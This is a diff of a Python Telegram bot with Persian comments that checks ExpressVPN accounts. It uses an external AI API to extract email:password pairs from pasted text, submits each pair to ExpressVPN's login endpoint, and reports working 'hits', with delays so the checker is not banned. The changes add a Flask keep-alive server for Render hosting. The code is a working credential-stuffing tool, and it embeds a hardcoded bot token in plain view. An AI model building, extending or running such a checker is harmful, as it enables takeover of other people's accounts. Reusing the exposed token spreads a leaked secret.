@@ -8,8 +8,13 @@ import random
 import string
 import html
 import asyncio
+import os
+import threading
 from datetime import datetime
 from io import BytesIO
+
+# Flask برای زنده نگه داشتن ربات در Render
+from flask import Flask
 
 # Telegram Imports
 from telegram import Update
@@ -25,12 +30,12 @@ from Crypto.Random import get_random_bytes
 from asn1crypto import cms, x509, keys
 
 # --- CONFIGURATION ---
-BOT_TOKEN = "8052532193:AAFz3V8ztDNcdCpfOyhi1bxm7XiJh8OJJCU"  # توکن ربات خود را اینجا وارد کنید
-AI_API_URL = "http://cactus-dev.ir/v1/grok.php"  # آدرس جدید API
+BOT_TOKEN = "8052532193:AAFz3V8ztDNcdCpfOyhi1bxm7XiJh8OJJCU"
+AI_API_URL = "http://cactus-dev.ir/v1/grok.php"
 
 # تنظیمات زمانی
-CHECK_TIMEOUT = 20  # ثانیه (برای درخواست وب)
-SLEEP_DELAY = 3     # ثانیه (وقفه بین هر اکانت)
+CHECK_TIMEOUT = 20
+SLEEP_DELAY = 3
 
 # تنظیمات لاگ
 logging.basicConfig(
@@ -38,12 +43,21 @@ logging.basicConfig(
     level=logging.INFO
 )
 
+# --- FLASK KEEP-ALIVE SERVER (FOR RENDER) ---
+app = Flask(__name__)
+
+@app.route('/')
+def home():
+    return "Bot is running perfectly!"
+
+def run_web_server():
+    # دریافت پورت از متغیرهای محیطی رندر یا پیش‌فرض 8080
+    port = int(os.environ.get("PORT", 8080))
+    app.run(host="0.0.0.0", port=port)
+
 # --- AI SORTER LOGIC ---
 
 def call_ai_sorter(raw_text):
-    """
-    استخراج و مرتب‌سازی اکانت‌ها با هوش مصنوعی Grok
-    """
     system_prompt = (
         "You are a data extractor. Extract valid email and password pairs from the user text. "
         "The input text may have emails and passwords on separate lines or mixed with other text. "
@@ -55,17 +69,12 @@ def call_ai_sorter(raw_text):
     full_prompt = f"{system_prompt}\n\nInput Text:\n{raw_text}"
     
     try:
-        # ارسال درخواست به صورت GET با پارامتر text
         params = {'text': full_prompt}
-        
-        # تایم‌اوت هوش مصنوعی
         response = requests.get(AI_API_URL, params=params, timeout=30)
         
         if response.status_code == 200:
             data = response.json()
-            # بررسی پاسخ طبق ساختار جدید Grok
             if data.get("ok"):
-                # در API جدید، متن پاسخ در فیلد "text" قرار دارد
                 ai_answer = data.get("text", "")
                 accounts = []
                 for line in ai_answer.split('\n'):
@@ -235,7 +244,6 @@ def check_expressvpn(email, password):
     }
 
     try:
-        # TIMEOUT تنظیم شده روی 20 ثانیه
         response = requests.post(url, data=encrypted_post_data, headers=headers, timeout=CHECK_TIMEOUT)
 
         if response.status_code == 200:
@@ -370,7 +378,7 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
         email = email.strip()
         password = password.strip()
 
-        # نمایش زنده ایمیل در حال بررسی (با هر بار تغییر)
+        # نمایش زنده ایمیل در حال بررسی
         try:
             await status_msg.edit_text(
                 f"🔄 <b>در حال بررسی ({index}/{total_accs}):</b>\n"
@@ -380,7 +388,7 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
                 parse_mode=ParseMode.HTML
             )
         except BadRequest:
-            pass # اگر پیام تغییر نکرده بود (بعید است چون ایمیل عوض می‌شود) خطا نده
+            pass 
 
         # بررسی اکانت
         result = await asyncio.to_thread(check_expressvpn, email, password)
@@ -406,10 +414,8 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
             await context.bot.send_message(chat_id=update.effective_chat.id, text=hit_msg, parse_mode=ParseMode.HTML)
         else:
             bad_hits += 1
-            # ذخیره ایمیل و پسورد و دلیل خطا برای بررسی شما
             bad_accounts_list.append(f"{email}:{password} | Status: {status}")
         
-        # وقفه 3 ثانیه برای دقت و جلوگیری از بن شدن
         await asyncio.sleep(SLEEP_DELAY)
 
     # پایان عملیات
@@ -422,8 +428,7 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
     )
     await status_msg.edit_text(final_text, parse_mode=ParseMode.HTML)
 
-    # ارسال فایل txt اکانت‌های خراب
-    if len(bad_accounts_list) > 3: # اگر چیزی جز هدر در لیست بود
+    if len(bad_accounts_list) > 3:
         bad_text_content = "\n".join(bad_accounts_list)
         file_obj = BytesIO(bad_text_content.encode('utf-8'))
         file_obj.name = f"Bad_Accounts_{datetime.now().strftime('%H%M')}.txt"
@@ -434,12 +439,18 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
             caption="❌ لیست اکانت‌های خراب جهت بررسی پسوردها"
         )
     else:
-        await context.bot.send_message(chat_id=update.effective_chat.id, text="🎉 تبریک! هیچ اکانت خرابی وجود نداشت (یا لیست خالی بود).")
+        await context.bot.send_message(chat_id=update.effective_chat.id, text="🎉 تبریک! هیچ اکانت خرابی وجود نداشت.")
 
 # --- MAIN EXECUTION ---
 
 if __name__ == '__main__':
-    print("Bot is running...")
+    # اجرای وب‌سرور در یک ترد جداگانه
+    # این کار باعث می‌شود Render پورت را باز ببیند و سرویس را نبندد
+    web_thread = threading.Thread(target=run_web_server)
+    web_thread.daemon = True
+    web_thread.start()
+    
+    print("Bot is starting...")
     application = ApplicationBuilder().token(BOT_TOKEN).build()
     
     application.add_handler(CommandHandler('start', start))
